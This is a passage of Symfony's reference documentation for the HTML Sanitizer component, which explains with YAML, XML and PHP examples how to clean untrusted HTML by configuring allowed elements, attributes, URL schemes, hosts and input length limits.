The HTML Sanitizer component aims at sanitizing/cleaning untrusted HTML
code (e.g. created by a WYSIWYG editor in the browser) into HTML that can
be trusted. It is based on the `HTML Sanitizer W3C Standard Proposal`_.

The HTML sanitizer creates a new HTML structure from scratch, taking only
the elements and attributes that are allowed by configuration. This means
that the returned HTML is very predictable (it only contains allowed
elements), but it does not work well with badly formatted input (e.g.
invalid HTML). The sanitizer is targeted for two use cases:

* Preventing security attacks based on :ref:`XSS <xss-attacks>` or other technologies
  relying on the execution of malicious code on the visitors browsers;
* Generating HTML that always respects a certain format (only certain
  tags, attributes, hosts, etc.) to be able to consistently style the
  resulting output with CSS. This also protects your application against
  attacks related to e.g. changing the CSS of the whole page.

.. _html-sanitizer-installation:

Installation
------------

You can install the HTML Sanitizer component with:

.. code-block:: terminal

    $ composer require symfony/html-sanitizer

Basic Usage
-----------

Use the :class:`Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer` class to
sanitize the HTML. In the Symfony framework, this class is available as the
``html_sanitizer`` service. This service will be :doc:`autowired </service_container/autowiring>`
automatically when type-hinting for
:class:`Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerInterface`:

.. configuration-block::

    .. code-block:: php-symfony

        // src/Controller/BlogPostController.php
        namespace App\Controller;

        // ...
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerInterface;

        class BlogPostController extends AbstractController
        {
            public function createAction(HtmlSanitizerInterface $htmlSanitizer, Request $request): Response
            {
                $unsafeContents = $request->getPayload()->get('post_contents');

                $safeContents = $htmlSanitizer->sanitize($unsafeContents);
                // ... proceed using the safe HTML
            }
        }

    .. code-block:: php-standalone

        use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

        $htmlSanitizer = new HtmlSanitizer(
            (new HtmlSanitizerConfig())->allowSafeElements()
        );

        // unsafe HTML (e.g. from a WYSIWYG editor in the browser)
        $unsafePostContents = ...;

        $safePostContents = $htmlSanitizer->sanitize($unsafePostContents);
        // ... proceed using the safe HTML

.. note::

    The default configuration of the HTML sanitizer allows all "safe"
    elements and attributes, as defined by the `W3C Standard Proposal`_. In
    practice, this means that the resulting code will not contain any
    scripts, styles or other elements that can cause the website to behave
    or look different. Later in this article, you'll learn how to
    :ref:`fully customize the HTML sanitizer <html-sanitizer-configuration>`.

Sanitizing HTML for a Specific Context
--------------------------------------

The default :method:`Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer::sanitize`
method cleans the HTML code for usage in the ``<body>`` element. Using the
:method:`Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer::sanitizeFor`
method, you can instruct HTML sanitizer to customize this for the
``<head>`` or a more specific HTML tag::

    // tags not allowed in <head> will be removed
    $safeInput = $htmlSanitizer->sanitizeFor('head', $userInput);

    // encodes the returned HTML using HTML entities
    $safeInput = $htmlSanitizer->sanitizeFor('title', $userInput);
    $safeInput = $htmlSanitizer->sanitizeFor('textarea', $userInput);

    // uses the <body> context, removing tags only allowed in <head>
    $safeInput = $htmlSanitizer->sanitizeFor('body', $userInput);
    $safeInput = $htmlSanitizer->sanitizeFor('section', $userInput);

Sanitizing HTML from Form Input
-------------------------------

The HTML sanitizer component directly integrates with Symfony Forms, to
sanitize the form input before it is processed by your application.

You can enable the sanitizer in ``TextType`` forms, or any form extending
this type (such as ``TextareaType``), using the ``sanitize_html`` option::

    // src/Form/BlogPostType.php
    namespace App\Form;

    // ...
    class BlogPostType extends AbstractType
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'sanitize_html' => true,
                // use the "sanitizer" option to use a custom sanitizer (see below)
                //'sanitizer' => 'app.post_sanitizer',
            ]);
        }
    }

.. _html-sanitizer-twig:

Sanitizing HTML in Twig Templates
---------------------------------

Besides sanitizing user input, you can also sanitize HTML code before
outputting it in a Twig template using the ``sanitize_html()`` filter:

.. code-block:: twig

    {{ post.body|sanitize_html }}

    {# you can also use a custom sanitizer (see below) #}
    {{ post.body|sanitize_html('app.post_sanitizer') }}

.. _html-sanitizer-configuration:

Configuration
-------------

The behavior of the HTML sanitizer can be fully customized. This allows you
to explicitly state which elements, attributes and even attribute values
are allowed.

You can do this by defining a new HTML sanitizer in the configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/html_sanitizer.yaml
        framework:
            html_sanitizer:
                sanitizers:
                    app.post_sanitizer:
                        block_elements:
                            - h1

    .. code-block:: xml

        <!-- config/packages/html_sanitizer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:html-sanitizer>
                    <framework:sanitizer name="app.post_sanitizer">
                        <framework:block-element name="h1"/>
                    </framework:sanitizer>
                </framework:html-sanitizer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->htmlSanitizer()
                ->sanitizer('app.post_sanitizer')
                    ->blockElement('h1')
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

        $postSanitizer = new HtmlSanitizer(
            (new HtmlSanitizerConfig())
                ->blockElement('h1')
        );

This configuration defines a new ``html_sanitizer.sanitizer.app.post_sanitizer``
service. This service will be :doc:`autowired </service_container/autowiring>`
for services having an ``HtmlSanitizerInterface $appPostSanitizer`` parameter.

Allow Element Baselines
~~~~~~~~~~~~~~~~~~~~~~~

You can start the custom HTML sanitizer by using one of the two baselines:

Static elements
    All elements and attributes on the baseline allow lists from the
    `W3C Standard Proposal`_ (this does not include scripts).
Safe elements
    All elements and attributes from the "static elements" list, excluding
    elements and attributes that can also lead to CSS
    injection/click-jacking.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/html_sanitizer.yaml
        framework:
            html_sanitizer:
                sanitizers:
                    app.post_sanitizer:
                        # enable either of these
                        allow_safe_elements: true
                        allow_static_elements: true

    .. code-block:: xml

        <!-- config/packages/html_sanitizer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:html-sanitizer>
                    <!-- allow-safe-elements/allow-static-elements:
                         enable either of these -->
                    <framework:sanitizer
                        name="app.post_sanitizer"
                        allow-safe-elements="true"
                        allow-static-elements="true"
                    />
                </framework:html-sanitizer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->htmlSanitizer()
                ->sanitizer('app.post_sanitizer')
                    // enable either of these
                    ->allowSafeElements(true)
                    ->allowStaticElements(true)
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

        $postSanitizer = new HtmlSanitizer(
            (new HtmlSanitizerConfig())
                // enable either of these
                ->allowSafeElements()
                ->allowStaticElements()
        );

Allow Elements
~~~~~~~~~~~~~~

This adds elements to the allow list. For each element, you can also
specify the allowed attributes on that element. If not given, all allowed
attributes from the `W3C Standard Proposal`_ are allowed.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/html_sanitizer.yaml
        framework:
            html_sanitizer:
                sanitizers:
                    app.post_sanitizer:
                        # ...
                        allow_elements:
                            # allow the <article> element and 2 attributes
                            article: ['class', 'data-attr']
                            # allow the <img> element and preserve the src attribute
                            img: 'src'
                            # allow the <h1> element with all safe attributes
                            h1: '*'

    .. code-block:: xml

        <!-- config/packages/html_sanitizer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:html-sanitizer>
                    <!-- allow-safe-elements/allow-static-elements:
                         enable either of these -->
                    <framework:sanitizer name="app.post_sanitizer">
                        <!-- allow the <article> element and 2 attributes -->
                        <framework:allow-element name="article">
                            <framework:attribute>class</framework:attribute>
                            <framework:attribute>data-attr</framework:attribute>
                        </framework:allow-element>

                        <!-- allow the <img> element and preserve the src attribute -->
                        <framework:allow-element name="img">
                            <framework:attribute>src</framework:attribute>
                        </framework:allow-element>

                        <!-- allow the <h1> element with all safe attributes -->
                        <framework:allow-element name="img">
                            <framework:attribute>*</framework:attribute>
                        </framework:allow-element>
                    </framework:sanitizer>
                </framework:html-sanitizer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->htmlSanitizer()
                ->sanitizer('app.post_sanitizer')
                    // allow the <article> element and 2 attributes
                    ->allowElement('article', ['class', 'data-attr'])

                    // allow the <img> element and preserve the src attribute
                    ->allowElement('img', 'src')

                    // allow the <h1> element with all safe attributes
                    ->allowElement('h1', '*')
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

        $postSanitizer = new HtmlSanitizer(
            (new HtmlSanitizerConfig())
                // allow the <article> element and 2 attributes
                ->allowElement('article', ['class', 'data-attr'])

                // allow the <img> element and preserve the src attribute
                ->allowElement('img', 'src')

                // allow the <h1> element with all safe attributes
                ->allowElement('h1')
        );

Block and Drop Elements
~~~~~~~~~~~~~~~~~~~~~~~

You can also block (the element will be removed, but its children
will be kept) or drop (the element and its children will be removed)
elements.

This can also be used to remove elements from the allow list.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/html_sanitizer.yaml
        framework:
            html_sanitizer:
                sanitizers:
                    app.post_sanitizer:
                        # ...

                        # remove <div>, but process the children
                        block_elements: ['div']
                        # remove <figure> and its children
                        drop_elements: ['figure']

    .. code-block:: xml

        <!-- config/packages/html_sanitizer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:html-sanitizer>
                    <!-- remove <div>, but process the children -->
                    <framework:block-element>div</framework:block-element>

                    <!-- remove <figure> and its children -->
                    <framework:drop-element>figure</framework:drop-element>
                </framework:html-sanitizer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->htmlSanitizer()
                ->sanitizer('app.post_sanitizer')
                    // remove <div>, but process the children
                    ->blockElement('div')
                    // remove <figure> and its children
                    ->dropElement('figure')
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

        $postSanitizer = new HtmlSanitizer(
            (new HtmlSanitizerConfig())
                // remove <div>, but process the children
                ->blockElement('div')
                // remove <figure> and its children
                ->dropElement('figure')
        );

Allow Attributes
~~~~~~~~~~~~~~~~

Using this option, you can specify which attributes will be preserved in
the returned HTML. The attribute will be allowed on the given elements, or
on all elements allowed *before this setting*.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/html_sanitizer.yaml
        framework:
            html_sanitizer:
                sanitizers:
                    app.post_sanitizer:
                        # ...
                        allow_attributes:
                            # allow "src' on <iframe> elements
                            src: ['iframe']

                            # allow "data-attr" on all elements currently allowed
                            data-attr: '*'

    .. code-block:: xml

        <!-- config/packages/html_sanitizer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:html-sanitizer>
                    <!-- allow "src' on <iframe> elements -->
                    <framework:allow-attribute name="src">
                        <framework:element>iframe</framework:element>
                    </framework:allow-attribute>

                    <!-- allow "data-attr" on all elements currently allowed -->
                    <framework:allow-attribute name="data-attr">
                        <framework:element>*</framework:element>
                    </framework:allow-attribute>
                </framework:html-sanitizer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->htmlSanitizer()
                ->sanitizer('app.post_sanitizer')
                    // allow "src' on <iframe> elements
                    ->allowAttribute('src', ['iframe'])

                    // allow "data-attr" on all elements currently allowed
                    ->allowAttribute('data-attr', '*')
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

        $postSanitizer = new HtmlSanitizer(
            (new HtmlSanitizerConfig())
                // allow "src' on <iframe> elements
                ->allowAttribute('src', ['iframe'])

                // allow "data-attr" on all elements currently allowed
                ->allowAttribute('data-attr', '*')
        );

Drop Attributes
~~~~~~~~~~~~~~~

This option allows you to disallow attributes that were allowed before.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/html_sanitizer.yaml
        framework:
            html_sanitizer:
                sanitizers:
                    app.post_sanitizer:
                        # ...
                        allow_attributes:
                            # allow the "data-attr" on all safe elements...
                            data-attr: '*'

                        drop_attributes:
                            # ...except for the <section> element
                            data-attr: ['section']
                            # disallows "style' on any allowed element
                            style: '*'

    .. code-block:: xml

        <!-- config/packages/html_sanitizer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:html-sanitizer>
                    <!-- allow the "data-attr" on all safe elements... -->
                    <framework:allow-attribute name="data-attr">
                        <framework:element>*</framework:element>
                    </framework:allow-attribute>

                    <!-- ...except for the <section> element -->
                    <framework:drop-attribute name="data-attr">
                        <framework:element>section</framework:element>
                    </framework:drop-attribute>

                    <!-- disallows "style' on any allowed element -->
                    <framework:drop-attribute name="style">
                        <framework:element>*</framework:element>
                    </framework:drop-attribute>
                </framework:html-sanitizer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->htmlSanitizer()
                ->sanitizer('app.post_sanitizer')
                    // allow the "data-attr" on all safe elements...
                    ->allowAttribute('data-attr', '*')

                    // ...except for the <section> element
                    ->dropAttribute('data-attr', ['section'])

                    // disallows "style' on any allowed element
                    ->dropAttribute('style', '*')
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

        $postSanitizer = new HtmlSanitizer(
            (new HtmlSanitizerConfig())
                // allow the "data-attr" on all safe elements...
                ->allowAttribute('data-attr', '*')

                // ...except for the <section> element
                ->dropAttribute('data-attr', ['section'])

                // disallows "style' on any allowed element
                ->dropAttribute('style', '*')
        );

Force Attribute Values
~~~~~~~~~~~~~~~~~~~~~~

Using this option, you can force an attribute with a given value on an
element. For instance, use the follow config to always set ``rel="noopener noreferrer"`` on each ``<a>``
element (even if the original one didn't contain a ``rel`` attribute):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/html_sanitizer.yaml
        framework:
            html_sanitizer:
                sanitizers:
                    app.post_sanitizer:
                        # ...
                        force_attributes:
                            a:
                                rel: noopener noreferrer

    .. code-block:: xml

        <!-- config/packages/html_sanitizer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:html-sanitizer>
                    <framework:force-attribute name="a">
                        <framework:attribute name="rel">noopener noreferrer</framework:attribute>
                    </framework:force-attribute>
                </framework:html-sanitizer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->htmlSanitizer()
                ->sanitizer('app.post_sanitizer')
                    ->forceAttribute('a', ['rel' => 'noopener noreferrer'])
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

        $postSanitizer = new HtmlSanitizer(
            (new HtmlSanitizerConfig())
                ->forceAttribute('a', 'rel', 'noopener noreferrer')
        );

.. _html-sanitizer-link-url:

Force/Allow Link URLs
~~~~~~~~~~~~~~~~~~~~~

Besides allowing/blocking elements and attributes, you can also control the
URLs of ``<a>`` elements:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/html_sanitizer.yaml
        framework:
            html_sanitizer:
                sanitizers:
                    app.post_sanitizer:
                        # ...

                        # if `true`, all URLs using the `http://` scheme will be converted to
                        # use the `https://` scheme instead. `http` still needs to be allowed
                        # in `allowed_link_schemes`
                        force_https_urls: true

                        # specifies the allowed URL schemes. If the URL has a different scheme, the
                        # attribute will be dropped
                        allowed_link_schemes: ['http', 'https', 'mailto']

                        # specifies the allowed hosts, the attribute will be dropped if the
                        # URL contains a different host. Subdomains are allowed: e.g. the following
                        # config would also allow 'www.symfony.com', 'live.symfony.com', etc.
                        allowed_link_hosts: ['symfony.com']

                        # whether to allow relative links (i.e. URLs without scheme and host)
                        allow_relative_links: true

    .. code-block:: xml

        <!-- config/packages/html_sanitizer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <!-- force-https-urls: if `true`, all URLs using the `http://` scheme will be
                                       converted to use the `https://` scheme instead.
                                       `http` still needs to be allowed in `allowed-link-scheme` -->
                <!-- allow-relative-links: whether to allow relative links (i.e. URLs without
                                           scheme and host) -->
                <framework:html-sanitizer
                    force-https-urls="true"
                    allow-relative-links="true"
                >
                    <!-- specifies the allowed URL schemes. If the URL has a different scheme,
                         the attribute will be dropped -->
                    <allowed-link-scheme>http</allowed-link-scheme>
                    <allowed-link-scheme>https</allowed-link-scheme>
                    <allowed-link-scheme>mailto</allowed-link-scheme>

                    <!-- specifies the allowed hosts, the attribute will be dropped if the
                         URL contains a different host. Subdomains are allowed: e.g. the following
                         config would also allow 'www.symfony.com', 'live.symfony.com', etc. -->
                    <allowed-link-host>symfony.com</allowed-link-host>
                </framework:html-sanitizer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->htmlSanitizer()
                ->sanitizer('app.post_sanitizer')
                    // if `true`, all URLs using the `http://` scheme will be converted to
                    // use the `https://` scheme instead. `http` still needs to be
                    // allowed in `allowedLinkSchemes`
                    ->forceHttpsUrls(true)

                    // specifies the allowed URL schemes. If the URL has a different scheme, the
                    // attribute will be dropped
                    ->allowedLinkSchemes(['http', 'https', 'mailto'])

                    // specifies the allowed hosts, the attribute will be dropped if the
                    // URL contains a different host. Subdomains are allowed: e.g. the following
                    // config would also allow 'www.symfony.com', 'live.symfony.com', etc.
                    ->allowedLinkHosts(['symfony.com'])

                    // whether to allow relative links (i.e. URLs without scheme and host)
                    ->allowRelativeLinks(true)
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

        $postSanitizer = new HtmlSanitizer(
            (new HtmlSanitizerConfig())
                // if `true`, all URLs using the `http://` scheme will be converted to
                // use the `https://` scheme instead. `http` still needs to be
                // allowed in `allowedLinkSchemes`
                ->forceHttpsUrls()

                // specifies the allowed URL schemes. If the URL has a different scheme, the
                // attribute will be dropped
                ->allowedLinkSchemes(['http', 'https', 'mailto'])

                // specifies the allowed hosts, the attribute will be dropped if the
                // URL contains a different host which is not a subdomain of the allowed host
                ->allowedLinkHosts(['symfony.com']) // Also allows any subdomain (i.e. www.symfony.com)

                // whether to allow relative links (i.e. URLs without scheme and host)
                ->allowRelativeLinks()
        );

Force/Allow Media URLs
~~~~~~~~~~~~~~~~~~~~~~

Like :ref:`link URLs <html-sanitizer-link-url>`, you can also control the
URLs of other media in the HTML. The following attributes are checked by
the HTML sanitizer: ``src``, ``href``, ``lowsrc``, ``background`` and ``ping``.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/html_sanitizer.yaml
        framework:
            html_sanitizer:
                sanitizers:
                    app.post_sanitizer:
                        # ...

                        # if `true`, all URLs using the `http://` scheme will be converted to
                        # use the `https://` scheme instead. `http` still needs to be allowed
                        # in `allowed_media_schemes`
                        force_https_urls: true

                        # specifies the allowed URL schemes. If the URL has a different scheme, the
                        # attribute will be dropped
                        allowed_media_schemes: ['http', 'https', 'mailto']

                        # specifies the allowed hosts, the attribute will be dropped if the URL
                        # contains a different host which is not a subdomain of the allowed host
                        allowed_media_hosts: ['symfony.com'] # Also allows any subdomain (i.e. www.symfony.com)

                        # whether to allow relative URLs (i.e. URLs without scheme and host)
                        allow_relative_medias: true

    .. code-block:: xml

        <!-- config/packages/html_sanitizer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <!-- force-https-urls: if `true`, all URLs using the `http://` scheme will be
                                       converted to use the `https://` scheme instead. `http`
                                       still needs to be allowed in `allowed-media-scheme` -->
                <!-- allow-relative-medias: whether to allow relative URLs (i.e. URLs without
                                           scheme and host) -->
                <framework:html-sanitizer
                    force-https-urls="true"
                    allow-relative-medias="true"
                >
                    <!-- specifies the allowed URL schemes. If the URL has a different scheme,
                         the attribute will be dropped -->
                    <allowed-media-scheme>http</allowed-media-scheme>
                    <allowed-media-scheme>https</allowed-media-scheme>
                    <allowed-media-scheme>mailto</allowed-media-scheme>

                    <!-- specifies the allowed hosts, the attribute will be dropped if the URL
                         contains a different host which is not a subdomain of the allowed host.
                         Also allows any subdomain (i.e. www.symfony.com) -->
                    <allowed-media-host>symfony.com</allowed-media-host>
                </framework:html-sanitizer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->htmlSanitizer()
                ->sanitizer('app.post_sanitizer')
                    // if `true`, all URLs using the `http://` scheme will be converted to
                    // use the `https://` scheme instead. `http` still needs to be
                    // allowed in `allowedMediaSchemes`
                    ->forceHttpsUrls(true)

                    // specifies the allowed URL schemes. If the URL has a different scheme, the
                    // attribute will be dropped
                    ->allowedMediaSchemes(['http', 'https', 'mailto'])

                    // specifies the allowed hosts, the attribute will be dropped if the URL
                    // contains a different host which is not a subdomain of the allowed host
                    ->allowedMediaHosts(['symfony.com']) // Also allows any subdomain (i.e. www.symfony.com)

                    // whether to allow relative URLs (i.e. URLs without scheme and host)
                    ->allowRelativeMedias(true)
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

        $postSanitizer = new HtmlSanitizer(
            (new HtmlSanitizerConfig())
                // if `true`, all URLs using the `http://` scheme will be converted to
                // use the `https://` scheme instead. `http` still needs to be
                // allowed in `allowedMediaSchemes`
                ->forceHttpsUrls()

                // specifies the allowed URL schemes. If the URL has a different scheme, the
                // attribute will be dropped
                ->allowedMediaSchemes(['http', 'https', 'mailto'])

                // specifies the allowed hosts, the attribute will be dropped if the URL
                // contains a different host which is not a subdomain of the allowed host
                ->allowedMediaHosts(['symfony.com']) // Also allows any subdomain (i.e. www.symfony.com)

                // whether to allow relative URLs (i.e. URLs without scheme and host)
                ->allowRelativeMedias()
        );

Max Input Length
~~~~~~~~~~~~~~~~

In order to prevent `DoS attacks`_, by default the HTML sanitizer limits the
input length to ``20000`` characters (as measured by ``strlen($input)``). All
the contents exceeding that length will be truncated. Use this option to
increase or decrease this limit:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/html_sanitizer.yaml
        framework:
            html_sanitizer:
                sanitizers:
                    app.post_sanitizer:
                        # ...

                        # inputs longer (in characters) than this value will be truncated
                        max_input_length: 30000 # default: 20000

    .. code-block:: xml

        <!-- config/packages/html_sanitizer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:html-sanitizer>
                    <framework:sanitizer name="app.post_sanitizer">
                        <!-- inputs longer (in characters) than this value will be truncated (default: 20000) -->
                        <framework:max-input-length>20000</framework:max-input-length>
                    </framework:sanitizer>
                </framework:html-sanitizer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->htmlSanitizer()
                ->sanitizer('app.post_sanitizer')
                    // inputs longer (in characters) than this value will be truncated (default: 20000)
                    ->withMaxInputLength(20000)
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

        $postSanitizer = new HtmlSanitizer(
            (new HtmlSanitizerConfig())
                // inputs longer (in characters) than this value will be truncated (default: 20000)
                ->withMaxInputLength(20000)
        );

It is possible to disable this length limit by setting the max input length to
``-1``. Beware that it may expose your application to `DoS attacks`_.

Custom Attribute Sanitizers
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Controlling the link and media URLs is done by the
:class:`Symfony\\Component\\HtmlSanitizer\\Visitor\\AttributeSanitizer\\UrlAttributeSanitizer`.
You can also implement your own attribute sanitizer, to control the value
of other attributes in the HTML. Create a class implementing
:class:`Symfony\\Component\\HtmlSanitizer\\Visitor\\AttributeSanitizer\\AttributeSanitizerInterface`
and register it as a service. After this, use ``with_attribute_sanitizers``
to enable it for an HTML sanitizer:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/html_sanitizer.yaml
        framework:
            html_sanitizer:
                sanitizers:
                    app.post_sanitizer:
                        # ...
                        with_attribute_sanitizers:
                            - App\Sanitizer\CustomAttributeSanitizer

                        # you can also disable previously enabled custom attribute sanitizers
                        #without_attribute_sanitizers:
                        #    - App\Sanitizer\CustomAttributeSanitizer

    .. code-block:: xml

        <!-- config/packages/html_sanitizer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:html-sanitizer>
                    <with-attribute-sanitizer>App\Sanitizer\CustomAttributeSanitizer</with-attribute-sanitizer>

                    <!-- you can also disable previously enabled attribute sanitizers -->
